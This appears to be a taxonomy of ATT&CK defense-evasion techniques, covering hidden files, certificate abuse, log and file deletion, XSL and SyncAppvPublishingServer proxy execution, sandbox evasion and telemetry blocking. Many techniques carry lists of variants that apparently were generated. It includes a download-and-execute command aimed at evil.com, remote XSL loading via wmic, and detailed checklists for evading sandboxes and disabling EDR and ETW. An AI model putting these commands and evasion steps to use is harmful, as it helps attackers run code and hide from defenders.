      Hidden Files and Directories: To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls –a</code> for Linux and macOS).  Adversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.  ### Windows  Users can mark specific files as hidden by using the attrib.exe binary. Simply do <code>attrib +h filename</code> to mark a file or folder as hidden. Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”.  ### Linux/Mac  Users can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: <code>defaults write com.apple.finder AppleShowAllFiles YES</code>, and then relaunch the Finder Application.  ### Mac  Files on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker). Many applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.
        ~Hidden System Files: Using system file attributes (+s flag on Windows, special system locations) to hide malicious files among legitimate system files
        ~Hidden User Files: Using standard hidden file mechanisms (dot prefix on Unix, +h attribute on Windows) in user directories
        ~Hidden Application Data: Hiding malicious content within legitimate application data directories and configuration folders
        ~Alternate Data Streams: Using NTFS alternate data streams to hide data without showing file size changes
        ~Hidden File Extensions: Manipulating file extensions and attributes to disguise file types while maintaining hidden status
        ~Hidden Network Shares: Creating and hiding files within hidden network shares
        ~Hidden Directory Structure: Creating complex nested directory structures with hidden attributes
        ~Protected Hidden Files: Combining hidden attributes with additional protections (read-only, system file flags)
        ~Hidden Temporary Files: Hiding malicious files in temporary directories with hidden attributes
        ~Hidden Backup Files: Disguising malicious files as hidden backup or system restore points
        ~Volume Shadow Copy Storage: Hiding files within Volume Shadow Copy storage areas to avoid detection
        ~Extended Attributes: Using extended file attributes to hide file metadata and content
        ~Junction Points: Using NTFS junction points to hide files through misdirection
        ~Resource Forks: Using macOS resource forks to hide data in seemingly normal files
        ~Hidden Virtual File Systems: Creating and hiding virtual file systems within normal files
        ~Hidden Archive Files: Hiding content within compressed archives with hidden attributes
        ~Hidden Registry Files: Using hidden registry hive files to store malicious content
        ~Hidden Device Files: Hiding files by masquerading as device files or special system objects
        ~Hidden Partition Files: Hiding files in unused disk partitions or partition gaps
        ~Hidden Swap Files: Concealing data within system swap/page files
        ~Hidden Memory-Mapped Files: Using memory-mapped files to hide content from normal file system views
        ~Hidden Container Files: Using encrypted container files with hidden attributes
        ~Cross-Platform Hidden Links: Using symbolic links across different file systems to hide files
        ~Hidden Kernel Objects: Hiding files by associating them with kernel objects
      Code Signing: Code signing provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. (Citation: Wikipedia Code Signing) However, adversaries are known to use code signing certificates to masquerade malware and tools as legitimate binaries (Citation: Janicab). The certificates used during an operation may be created, forged, or stolen by the adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates)  Code signing to verify software on first run can be used on modern Windows and macOS/OS X systems. It is not used on Linux due to the decentralized nature of the platform. (Citation: Wikipedia Code Signing)  Code signing certificates may be used to bypass security policies that require signed code to execute on a system.
        ~Stolen Code Signing Certificates: Adversaries steal legitimate code signing certificates from compromised organizations to sign malicious code
        ~Purchase Code Signing Certificates: Adversaries obtain valid code signing certificates through legitimate purchase channels using false identities
        ~Self-Signed Certificates: Creation of self-signed certificates to sign malicious code and potentially bypass security controls
        ~Digital Certificate Cloning: Adversaries create copies of legitimate certificates to sign malware
        ~Timestamp Manipulation: Modification of code signing timestamps to make malware appear to be signed at a different time
        ~Extended Validation (EV) Certificate Abuse: Exploitation of high-trust EV certificates for malicious code signing
        ~Code Signing Service Abuse: Misuse of legitimate code signing services or platforms
        ~Certificate Authority Compromise: Exploitation of compromised certificate authorities to generate valid certificates
        ~Legacy Certificate Exploitation: Abuse of expired but still-trusted certificates
        ~Hardware Security Module (HSM) Compromise: Targeting HSMs to steal stored code signing certificates and private keys
        ~Windows Authenticode Abuse: Exploitation of Windows-specific code signing mechanisms
        ~Apple Developer Certificate Abuse: Misuse of Apple's code signing infrastructure and developer certificates
        ~Certificate Chain Manipulation: Modifying or forging certificate trust chains
        ~Software Development Kit (SDK) Signing Abuse: Exploitation of SDK signing mechanisms
        ~Driver Signing Bypass: Specific techniques to bypass driver signing requirements
        ~Package Signing Abuse: Manipulation of package manager signing mechanisms
        ~Cross-Certificate Exploitation: Abuse of cross-signed certificates between different certificate authorities
        ~Code Signing Policy Bypass: Techniques to circumvent organizational code signing policies
        ~Container Image Signing Abuse: Exploitation of container image signing mechanisms and registries
        ~Cloud Service Provider Signing Abuse: Misuse of cloud platform code signing services
        ~Firmware Signing Bypass: Techniques to bypass firmware signing requirements
        ~Mobile App Certificate Abuse: Exploitation of mobile app signing processes and certificates
        ~Script Signing Bypass: Techniques specific to bypassing script signing requirements (e.g., PowerShell)
        ~Signature Timestamp Service Abuse: Exploitation of timestamp authority services
      File Deletion: Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.  There are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well. Examples include native [cmd](https://attack.mitre.org/software/S0106) functions such as DEL, secure deletion tools such as Windows Sysinternals SDelete, or other third-party file deletion tools. (Citation: Trend Micro APT Attack Tools)
        ~Windows System File Deletion: Adversaries delete system files using native Windows commands and utilities while avoiding detection mechanisms
        ~Secure File Deletion: Adversaries use specialized tools to securely wipe files by overwriting data multiple times
        ~Volume Shadow Copy Deletion: Adversaries delete Volume Shadow Copies to prevent file recovery and forensic analysis
        ~Temporary File Cleanup: Adversaries remove temporary files, logs, and cached data that could reveal their activities
        ~Registry File Deletion: Adversaries delete registry files and backups to hide system modifications
        ~Application Log Deletion: Adversaries target and remove specific application logs that record their activities
        ~Browser History Deletion: Adversaries clean browser history, cache, and related files to hide web-based activities
        ~Network Share Cleanup: Adversaries delete files from network shares and mapped drives to hide lateral movement
        ~Timestomp After Deletion: Adversaries modify timestamps of parent directories after file deletion to hide when deletion occurred
        ~Recursive Directory Deletion: Adversaries use recursive deletion to remove entire directory structures and their contents
        ~Linux System File Deletion: Adversaries use Linux-specific commands and utilities to remove files while avoiding detection
        ~MacOS File Deletion: Adversaries leverage MacOS-specific methods including secure empty trash and command line utilities
        ~Alternate Data Stream Deletion: Adversaries remove ADS to hide evidence of file manipulation on NTFS
        ~Memory-Mapped File Deletion: Adversaries delete memory-mapped files to remove evidence of in-memory operations
        ~File System Journal Cleanup: Adversaries manipulate or clear file system journals to hide deletion activities
        ~Deleted File Overwriting: Adversaries overwrite deleted file space with random data to prevent recovery
        ~Remote File Deletion: Adversaries use remote administration tools or protocols to delete files on compromised systems
        ~Scheduled File Deletion: Adversaries create scheduled tasks or jobs to delete files at specific times
        ~File Deletion via API: Adversaries leverage system APIs directly to bypass standard deletion utilities and monitoring
        ~Container Artifact Deletion: Adversaries remove container logs, images, and related artifacts to hide container-based activities
        ~Cloud Storage Deletion: Adversaries delete files across cloud storage services and backup systems
        ~Database File Deletion: Adversaries target database files, transaction logs, and backup files to hide data theft
        ~Encrypted File Deletion: Adversaries delete encryption keys along with encrypted files to ensure unrecoverability
        ~Versioning System Cleanup: Adversaries remove files from version control systems and their history logs
        ~Snapshot Deletion: Adversaries delete system and storage snapshots to prevent recovery of deleted files
        ~File System Manipulation: Adversaries manipulate file system structures directly to hide deletion activities
        ~Cross-Platform File Deletion: Adversaries use methods that work across different operating systems to maintain consistency
      XSL Script Processing: Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)  Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)  Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)  * <code>msxsl.exe customers[.]xml script[.]xsl</code> * <code>msxsl.exe script[.]xsl script[.]xsl</code> * <code>msxsl.exe script[.]jpeg script[.]jpeg</code>  Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)  Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)  * Local File: <code>wmic process list /FORMAT:evil[.]xsl</code> * Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>
        ~MSXSL Execution: Adversaries may use msxsl.exe to execute malicious JavaScript code embedded in XSL files, allowing for execution while bypassing application controls
        ~WMI Format Abuse: Adversaries may abuse the WMI /FORMAT switch to execute malicious XSL scripts through a trusted Windows utility
        ~Remote XSL Loading: Adversaries may host malicious XSL files remotely and load them through URL references to evade local detection
        ~File Extension Spoofing: Adversaries may use arbitrary file extensions for XSL files to bypass extension-based security controls
        ~XML Source File Manipulation: Adversaries may manipulate the XML source file to contain malicious content that gets processed during XSL transformation
        ~Embedded Script Obfuscation: Adversaries may obfuscate the malicious scripts within XSL files to avoid detection by security tools
        ~XSL Transformation Chaining: Adversaries may chain multiple XSL transformations together to complicate analysis and evade detection
        ~XSLT Parameter Injection: Adversaries may abuse XSLT parameters to pass malicious commands or data during transformation
        ~In-Memory XSL Processing: Adversaries may perform XSL transformations entirely in memory to avoid writing files to disk
        ~Custom XSL Processor Usage: Adversaries may use alternative XSL processors or custom implementations to bypass security controls focused on msxsl.exe
      Direct Volume Access: Adversaries may directly access a volume to bypass file access controls and file system monitoring. Windows allows programs to have direct access to logical volumes. Programs with direct access may read and write files directly from the drive by analyzing file system data structures. This technique may bypass Windows file access controls as well as file system monitoring tools. (Citation: Hakobyan 2009)  Utilities, such as `NinjaCopy`, exist to perform these actions in PowerShell.(Citation: Github PowerSploit Ninjacopy) Adversaries may also use built-in or third-party utilities (such as `vssadmin`, `wbadmin`, and [esentutl](https://attack.mitre.org/software/S0404)) to create shadow copies or backups of data from system volumes.(Citation: LOLBAS Esentutl)
        ~Raw Volume Access: Using low-level disk access methods to read/write directly to volumes, bypassing Windows file system protections and monitoring
        ~Shadow Copy Access: Leveraging Volume Shadow Copy Service (VSS) to access or create shadow copies of volumes for data extraction
        ~Volume Backup Manipulation: Using backup utilities to create and access volume backups, potentially bypassing access controls
        ~Memory-Mapped Volume Access: Mapping physical volumes to memory space for direct access and manipulation
        ~Alternate Data Stream Access: Accessing NTFS alternate data streams through direct volume operations
        ~Disk Image Creation: Creating full disk images to access volume contents offline
        ~Volume Mount Point Abuse: Manipulating volume mount points to access protected volumes
        ~Physical Drive Access: Directly accessing physical drives through raw interfaces like \\.\PhysicalDrive0
        ~Recovery Environment Access: Accessing volumes through Windows Recovery Environment (WinRE) or other recovery modes
        ~Driver-Based Access: Using custom or third-party drivers to gain direct volume access
        ~Hibernation File Access: Accessing volume data through hibernation file manipulation
        ~Snapshot Volume Access: Creating and accessing volume snapshots through various Windows APIs
        ~Page File Access: Direct access to page file volumes to extract sensitive data
      Virtualization/Sandbox Evasion: Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)  Adversaries may use several methods to accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.(Citation: Unit 42 Pirpi July 2015)
        System Checks: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)  Specific checks will vary based on the target and/or adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012) to obtain system information and search for VME artifacts. Adversaries may search for VME artifacts in memory, processes, file system, hardware, and/or the Registry. Adversaries may use scripting to automate these checks  into one script and then have the program exit if it determines the system to be a virtual environment.   Checks could include generic system properties such as host/domain name and samples of network traffic. Adversaries may also check the network adapters addresses, CPU core count, and available memory/drive size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083) to check if it was saved in a folder or file with unexpected or even analysis-related naming artifacts such as `malware`, `sample`, or `hash`.  Other common checks may enumerate services running that are unique to these applications, installed programs on the system, manufacturer/product fields for strings relating to virtual machine applications, and VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also use a special I/O port to send commands and receive output.    Hardware checks, such as the presence of the fan, temperature, and audio devices, could also be used to gather evidence that can be indicative a virtual environment. Adversaries may also query for specific readings from these devices.(Citation: Unit 42 OilRig Sept 2018)
          Use WMI queries to check system manufacturer and model for VM-specific strings like "VMware", "VirtualBox", or "QEMU"
          Query registry keys for VM-related services and drivers (e.g., HKLM\SYSTEM\CurrentControlSet\Services\vmtools)
          Check CPU characteristics via CPUID instruction for virtualization artifacts
          Monitor system temperature and fan readings through hardware sensors
          Examine network adapter MAC addresses for known VM vendor prefixes
          Search for analysis tool processes like "wireshark.exe", "procmon.exe", or "ollydbg.exe"
          Check memory size and disk capacity for unusually small values typical in VMs
          Scan file system for VM-related files and folders (e.g., VMware Tools installation paths)
          Test for VM-specific I/O ports (e.g., VMware backdoor I/O port 0x5658)
          Look for sandbox-related environment variables and filesystem paths
          Search for analysis-related strings in computer name or domain (e.g., "lab", "sandbox", "malware")
          Monitor network latency and packet patterns for sandbox characteristics
          Check for presence of common analysis environment services (e.g., Python debugging services)
          Enumerate installed security products through Windows Management Instrumentation
          Create composite scripts combining multiple checks with weighted scoring
          Check system uptime and user activity patterns
          Examine graphics adapter properties for VM-typical configurations
          Monitor mouse movement patterns for automated sandbox behavior
          Check for debugging flags and attached debuggers
          Verify system language and locale settings for analysis lab patterns
          Check for virtual disk signatures and storage controller types
          Examine BIOS version and firmware characteristics
          Monitor DLL loading patterns typical of analysis environments
          Check for memory artifacts from common sandbox frameworks
          Verify USB device presence and characteristics
          Test for virtualized vs physical keyboard/mouse input devices
          Monitor system resource allocation patterns
          Check for snapshot-related artifacts in filesystem and memory
          Test for presence and behavior of sound devices
          Examine processor scheduling and timing anomalies
          Check for cloud metadata endpoints and services
          Detect container runtime environments (Docker, LXC)
          Use timing delays and sleep calls to detect accelerated analysis
          Check memory page allocation patterns specific to hypervisors
          Test for presence of vendor-specific analysis tools (FireEye, Cuckoo)
          Examine system power management characteristics
          Check for hardware-assisted virtualization features
          Detect memory forensics tool artifacts
          Test for sandbox-specific network configurations
          Verify system restore and recovery settings
        Time Based Evasion: Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.  Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex: [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053)). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled [Multi-Stage Channels](https://attack.mitre.org/techniques/T1104) to avoid analysis and scrutiny.(Citation: Deloitte Environment Awareness)  Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as [Ping](https://attack.mitre.org/software/S0097)s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.(Citation: Revil Independence Day)(Citation: Netskope Nitol) Another variation, commonly referred to as API hammering, involves making various calls to [Native API](https://attack.mitre.org/techniques/T1106) functions in order to delay execution (while also potentially overloading analysis environments with junk data).(Citation: Joe Sec Nymaim)(Citation: Joe Sec Trickbot)  Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.(Citation: ISACA Malware Tricks)
          Use Sleep() API calls with extended delays to exceed sandbox timeout limits
          Implement GetTickCount() checks to measure execution time and detect accelerated VMs
          Create scheduled tasks that execute malware after extended delays
          Execute repeated ping commands with long intervals to delay execution
          Perform recursive API calls to native functions to create execution delays
          Check system uptime using GetLastBootUpTime to identify fresh sandbox environments
          Compare multiple time sources (system clock, NTP, online services) to detect time manipulation
          Use Windows Task Scheduler to create delayed execution triggers based on system events
          Implement loops with QueryPerformanceCounter to detect timing inconsistencies
          Execute benign CPU-intensive calculations to create natural execution delays
          Implement multi-stage payload delivery with time gaps between stages
          Check for specific dates or time windows before executing malicious code
          Use DNS TTL values and response times for timing validation
          Monitor user idle time through GetLastInputInfo to detect sandbox environments
          Create time-based dead code loops that only execute during specific hours
          Measure network latency through HTTP requests to detect sandboxed networks
          Use WMI queries to check system runtime statistics for sandbox detection
          Implement time-delayed registry modifications for staged execution
          Check process creation times of common system processes to detect fresh VMs
          Use Windows performance counters to measure genuine system activity time
          Measure CPU frequency fluctuations to detect VM time acceleration
          Check disk I/O operation timing patterns for sandbox detection
          Compare thread execution times across multiple CPU cores
          Monitor power state changes and system resume delays
          Check audio subsystem timing for virtualization detection
          Measure memory allocation and deallocation timing patterns
          Compare DLL loading times against known baseline values
          Monitor graphics rendering time for VM detection
          Check USB device enumeration timing for sandbox environments
          Measure interrupt handling delays to detect virtualized environments
          Compare time synchronization patterns across domain controllers
          Monitor browser cache timestamp consistencies
          Check timestamp patterns in Windows event logs
          Measure service start and stop operation timings
          Compare file system journal entry timestamps
          Monitor group policy update timing patterns
          Check certificate validation timing against external CAs
          Measure authentication token expiration behaviors
          Monitor scheduled backup operation timing patterns
          Compare Windows update timestamp consistencies
        User Activity Based Checks: Adversaries may employ various user activity checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) during automated discovery to shape follow-on behaviors.(Citation: Deloitte Environment Awareness)  Adversaries may search for user activity on the host based on variables such as the speed/frequency of mouse movements and clicks (Citation: Sans Virtual Jan 2016) , browser history, cache, bookmarks, or number of files in common directories such as home or the desktop. Other methods may rely on specific user interaction with the system before the malicious code is activated, such as waiting for a document to close before activating a macro (Citation: Unit 42 Sofacy Nov 2018) or waiting for a user to double click on an embedded image to activate.(Citation: FireEye FIN7 April 2017)
          Monitor mouse movement patterns and click frequency using Windows API calls to detect automated environments
          Check browser history size and timestamp patterns via registry or file system queries
          Count number of files in user directories (Desktop, Documents, Downloads) to identify fresh VM setups
          Implement delays until specific user interactions (document closing) before executing malicious macros
          Monitor browser cache and cookie counts to detect sandbox environments
          Check for recently used applications in JumpLists and MRU lists
          Verify existence and age of browser bookmarks
          Track keyboard input patterns and typing speed using keyboard hooks
          Monitor process creation patterns typical of real user activity
          Implement image click-based triggers requiring specific user interaction sequences
          Check Windows idle time through GetLastInputInfo API to detect automated environments
          Examine user profile customization (wallpaper changes, personalized settings) for sandbox detection
          Monitor screen saver activation patterns and settings
          Check for presence and usage patterns of common applications like Microsoft Office, email clients
          Verify existence and age of Recent Items in Windows
          Analyze Windows event logs for typical user login/logout patterns
          Check for presence and usage of USB devices indicating human interaction
          Monitor network activity patterns typical of human browsing behavior
          Examine Windows prefetch data for application usage history
          Check for personalized application settings and configurations
          Check email client activity patterns (Outlook/Thunderbird folder sizes and message counts)
          Verify system uptime and boot time patterns against typical sandbox behaviors
          Monitor clipboard content and usage patterns
          Check for presence and usage of instant messaging/communication applications
          Analyze printer spooler activity and print history
          Check for presence and usage of media player applications and history
          Monitor system volume changes and audio device usage
          Examine user-specific scheduled tasks and their execution history
          Check for presence and modification times of user-created shortcuts
          Analyze power management and sleep/hibernate patterns
      Indicator Blocking: An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).  ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.  In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products.
        ~ETW Provider Blocking: Disabling or modifying Event Tracing for Windows providers through PowerShell cmdlets or registry modifications to prevent event collection
        ~Telemetry Process Termination: Stopping processes responsible for collecting and forwarding telemetry data
        ~Firewall Rule Manipulation: Creating or modifying firewall rules to block communication with security monitoring infrastructure
        ~Registry Key Tampering: Modifying registry keys related to logging and monitoring configurations
        ~Sensor Driver Interference: Disabling or corrupting security tool drivers to prevent monitoring
        ~Log Collection Service Disruption: Interfering with Windows Event Log service and other logging services
        ~SIEM Communication Blocking: Preventing systems from sending data to SIEM platforms through various network blocking techniques
        ~Monitoring Agent Configuration: Modifying configuration files of security monitoring agents to disable or reduce their effectiveness
        ~API Hooking Prevention: Blocking security tools from hooking into processes for monitoring
        ~Sensor Process Masquerading: Replacing legitimate monitoring processes with malicious ones that don't report activity
        ~EDR Sensor Avoidance: Specifically targeting and disabling Endpoint Detection and Response sensors
        ~Cloud Telemetry Blocking: Preventing cloud workloads from sending security telemetry to cloud security services
        ~Memory Scanning Prevention: Blocking security tools from scanning process memory for malicious patterns
        ~Syslog Redirection: Redirecting or blocking syslog traffic to prevent centralized logging
        ~Performance Counter Disruption: Disabling or manipulating Windows performance counters used for security monitoring
        ~Container Security Monitoring Disruption: Blocking container security monitoring and logging mechanisms
        ~Hypervisor Sensor Blocking: Preventing VM-level security monitoring by interfering with hypervisor-based sensors
        ~Kernel Callback Blocking: Preventing security tools from registering kernel callbacks for system monitoring
        ~Security Tool Plugin Disruption: Disabling or corrupting plugins/extensions used by security monitoring tools
      Deploy Container: Adversaries may deploy a container into an environment to facilitate execution or evade defenses. In some cases, adversaries may deploy a new container to execute processes associated with a particular image or deployment, such as processes that execute or download malware. In others, an adversary may deploy a new container configured without network rules, user limitations, etc. to bypass existing defenses within the environment. In Kubernetes environments, an adversary may attempt to deploy a privileged or vulnerable container into a specific node in order to [Escape to Host](https://attack.mitre.org/techniques/T1611) and access other containers running on the node. (Citation: AppSecco Kubernetes Namespace Breakout 2020)  Containers can be deployed by various means, such as via Docker's <code>create</code> and <code>start</code> APIs or via a web application such as the Kubernetes dashboard or Kubeflow. (Citation: Docker Containers API)(Citation: Kubernetes Dashboard)(Citation: Kubeflow Pipelines) In Kubernetes environments, containers may be deployed through workloads such as ReplicaSets or DaemonSets, which can allow containers to be deployed across multiple nodes.(Citation: Kubernetes Workload Management) Adversaries may deploy containers based on retrieved or built malicious images or from benign images that download and execute malicious payloads at runtime.(Citation: Aqua Build Images on Hosts)
        ~Docker API Abuse: Adversaries may abuse Docker's REST API to deploy containers, bypassing authentication and authorization controls
        ~Kubernetes Dashboard Exploitation: Adversaries may exploit vulnerabilities or misconfigurations in Kubernetes dashboard to deploy malicious containers
        ~Privileged Container Deployment: Adversaries may deploy containers with elevated privileges to escape container isolation
        ~DaemonSet Abuse: Adversaries may abuse DaemonSets to ensure malicious containers run on all nodes in a cluster
        ~Malicious Image Deployment: Adversaries may deploy containers using previously compromised or malicious container images
        ~Runtime Configuration Bypass: Adversaries may deploy containers with minimal security configurations to bypass runtime security controls
        ~Cross-Node Deployment: Adversaries may deploy containers across multiple nodes to maintain persistence and evade detection
        ~Pipeline Injection: Adversaries may inject malicious container deployments into CI/CD pipelines
      System Script Proxy Execution: Adversaries may use trusted scripts, often signed with certificates, to proxy the execution of malicious files. Several Microsoft signed scripts that have been downloaded from Microsoft or are default on Windows installations can be used to proxy execution of other files.(Citation: LOLBAS Project) This behavior may be abused by adversaries to execute malicious files that could bypass application control and signature validation on systems.(Citation: GitHub Ultimate AppLocker Bypass List)
        SyncAppvPublishingServer: Adversaries may abuse SyncAppvPublishingServer.vbs to proxy execution of malicious [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands. SyncAppvPublishingServer.vbs is a Visual Basic script associated with how Windows virtualizes applications (Microsoft Application Virtualization, or App-V).(Citation: 1 - appv) For example, Windows may render Win32 applications to users as virtual applications, allowing users to launch and interact with them as if they were installed locally.(Citation: 2 - appv)(Citation: 3 - appv)      The SyncAppvPublishingServer.vbs script is legitimate, may be signed by Microsoft, and is commonly executed from `\System32` through the command line via `wscript.exe`.(Citation: 4 - appv)(Citation: 5 - appv)  Adversaries may abuse SyncAppvPublishingServer.vbs to bypass [PowerShell](https://attack.mitre.org/techniques/T1059/001) execution restrictions and evade defensive counter measures by "living off the land."(Citation: 6 - appv)(Citation: 4 - appv) Proxying execution may function as a trusted/signed alternative to directly invoking `powershell.exe`.(Citation: 7 - appv)  For example,  [PowerShell](https://attack.mitre.org/techniques/T1059/001) commands may be invoked using:(Citation: 5 - appv)  `SyncAppvPublishingServer.vbs "n; {PowerShell}"`
          Execute PowerShell commands through SyncAppvPublishingServer.vbs using syntax: wscript.exe SyncAppvPublishingServer.vbs "n;Start-Process calc.exe"
          Use SyncAppvPublishingServer.vbs to download and execute remote payloads: wscript.exe SyncAppvPublishingServer.vbs "n;IEX (New-Object Net.WebClient).DownloadString('http://evil.com/script.ps1')"
          Chain multiple PowerShell commands using semicolon delimiter: wscript.exe SyncAppvPublishingServer.vbs "n;cmd1;cmd2;cmd3"
          Execute encoded PowerShell commands: wscript.exe SyncAppvPublishingServer.vbs "n;powershell -enc BASE64_ENCODED_COMMAND"
          Leverage SyncAppvPublishingServer.vbs to bypass AppLocker by executing from System32 directory: C:\Windows\System32\SyncAppvPublishingServer.vbs
          Use alternative PowerShell parameter variations like -nop, -w hidden with SyncAppvPublishingServer.vbs
          Execute in-memory PowerShell scripts through SyncAppvPublishingServer.vbs to avoid disk writes
          Abuse WScript.Shell COM object through SyncAppvPublishingServer.vbs for command execution
